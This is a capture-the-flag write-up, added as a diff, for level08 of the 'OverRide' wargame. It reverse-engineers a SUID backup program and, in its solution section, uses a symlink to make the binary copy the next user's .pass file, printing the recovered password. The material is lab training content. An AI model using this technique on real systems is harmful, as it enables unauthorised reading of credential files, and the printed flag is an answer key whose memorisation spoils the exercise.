@@ -1,0 +1,60 @@
+1.	Program type:
+	Running the command `file ./level08` we see the file is 64-bit ELF
+	executable.
+	Running the command `checksec --file ./level08 we see that the stack is
+    executable (NX disabled) and there is a stack canary (Canary found) and a Full RELRO.
+
+2. Content:
+    In `main` we got first of all a check on the number of argument, it seems like the
+    program only accepts 1 argument.
+
+    after that we got a call the the function `fopen` that opens a file "./backups/.log"
+    in writing mode "w" if it fails to open the file it will just print an error message
+    using `printf` then use `exit(0x1)` to quit the program.
+
+    After it we got a call to a function named `log_wrapper` we pass to it the FILE pointer to the log file opened previously a string ("Starting back up: "),
+    and the first argument passed to the executable.
+
+    In `log_wrapper`, with a call to `strcpy` the string passed as a parameter is saved,
+    then using `snprintf` and `strlen` it concatenate the string with the third argument
+    passed to the function which is the filename, after that with the use of `strcspn`
+    it adds a terminating null byte, after it prints the buffer content into the file
+    passed ("./backups/.log") using `fprintf`.
+
+    Back to our main, the program opens the file passed in argument in read mode "r"
+    if an error occure like for log it prints an error message then quit the program.
+
+    A call to `strcpy` to put the string "./backups/" in the buffer then concatenate it
+    with the value passed as argument with `strncat` then uses `open` to open the file
+    specified in buffer, `open` got some parameter, `flag` and `mode` that we couldnt figure ou their the exact value, but upon testing it uses the flag "O_CREATE" to
+    create a new file and obviously "O_WRONLY" to write to it.
+
+    then using a loop it writes every character from file specified in the arguments,
+    to the newly created file in "./backup".
+
+    `log_wrapper` is called again to signify that the backup is finished, then
+    both file descriptors of the "source file" and the "backup" are closed.
+
+3. Solution:
+    Well firsty we tried to put the full path to the .pass file cuz since its a SUID
+    program there's nothing stoping it from doing a backup of that file.
+
+    ```
+    level08@OverRide:~$ ./level08 /home/users/level09/.pass
+    ERROR: Failed to open ./backups//home/users/level09/.pass
+    level08@OverRide:~$
+    ```
+    seems like the cant create such backup file using the absolute path, so lets try
+    to make a symbolic link over that path in our current directory.
+
+    ```
+    level08@OverRide:~$ clear
+    level08@OverRide:~$ ln -s /home/users/level09/.pass level09_pass
+    level08@OverRide:~$ ls
+    backups  level08  level09_pass
+    level08@OverRide:~$ ./level08 level09_pass
+    level08@OverRide:~$ cat backups/level09_pass
+    fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+    level08@OverRide:~$
+    ```
+    and this time it worked !
